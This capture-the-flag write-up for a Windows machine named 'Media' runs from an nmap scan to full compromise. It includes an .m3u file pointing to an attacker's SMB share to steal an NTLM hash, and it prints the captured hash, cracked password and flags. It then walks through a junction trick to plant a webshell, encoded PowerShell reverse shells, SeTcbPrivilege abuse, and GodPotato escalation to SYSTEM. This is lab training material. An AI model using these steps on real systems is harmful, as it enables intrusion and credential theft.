# Media

## NMAP 
```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2025-12-13T12:20:26
|_Not valid after:  2026-06-14T12:20:26
|_ssl-date: 2025-12-14T12:43:44+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-14T12:43:39+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Foothold
- the webapp allows a file upload which will be opened by a windows media player.
- uploading a UNC path `.m3u` file.
```
#EXTM3U
#EXTINF:-1
\\10.10.14.183\share\payload
```
- start an impacket smb server and upload the above file
- we get a hash back for enox
```
enox::MEDIA:aaaaaaaaaaaaaaaa:9c4c8f27c80a0fd2bb4a7ee8d42f5277:0101000000000000000a9b59016ddc010b36673544a2f45800000000010010006e00460071005a006500570047006800030010006e00460071005a0065005700470068000200100073004200470070006c0066006f0044000400100073004200470070006c0066006f00440007000800000a9b59016ddc0106000400020000000800300030000000000000000000000000300000c30d9563095ee4f419000abdaa5de0dadbe47be902bef689872cd28c3494f3cb0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100380033000000000000000000
```
- cracking the hash we get `enox:1234virus@`
- `ssh enox@10.129.234.67` to get user.txt - 8691065983a2417184ab2761d9806f8b

## PrivEsc
- tried using nssm but no way.
- reading `C:\Users\enox\Documents\read.ps1`
- shows that files are uploaded to `\Windows\Tasks\Uploads`
- we can try to get access as the user running the webserver (usually `nt authority\local service`)
- we dont have access to `xampp\htdocs` or we would have uploaded a webshell there and accessed it from the website.
- but since we can upload files to a known folder - md5(first + lastname + email), we can create a link that will upload it to our webserver folder.
- eg: we are uploading a file as `Eliot + Ald + eliot@ecorp.com`
    - `cmd /c mklink /J C:\Windows\Tasks\Uploads\f675b3cef288699c2580f7ac1a63f812 C:\xampp\htdocs`
- upload `laudanum\webshell.php` and access it from the website.
- `whoami` shows `nt authority\local service`
- get a reverse shell using `powershell -e payload`
- `whoami /priv` shows `SeTcbPrivilege` but is disabled
- upload `EnableAllPrivTokens.ps1` and `.\EnableAllPrivTokens.ps1`
    - this will enable the priv
- use - https://github.com/b4lisong/SeTcbPrivilege-Abuse?tab=readme-ov-file
- use `msfvenom` to generate a revshell payload send `rev.exe` to target
- start a multi handler and run `.\TcbElevation.exe somestring "C:\temp\rev.exe"` to get a reverse shell as Admin 
- get root.txt - 32f78b08926019e354bde22b2c073b42

### PART 2
- we can get a reverse shell from `nt authority\local service` again using https://github.com/itm4n/FullPowers
    - `.\FullPowers.exe -c 'powershell -e JABjAGwAaQBlAG4`
    - this will enable all allowed privileges (like a UAC allowed terminal)
    - here we see SeImpersonatePrivileges as well.
- then we can run godpotato https://github.com/BeichenDream/GodPotato
    - `.\gp.exe -cmd 'powershell -e JABjAGwAaQBl`
    - this gets a reverse shell as SYSTEM
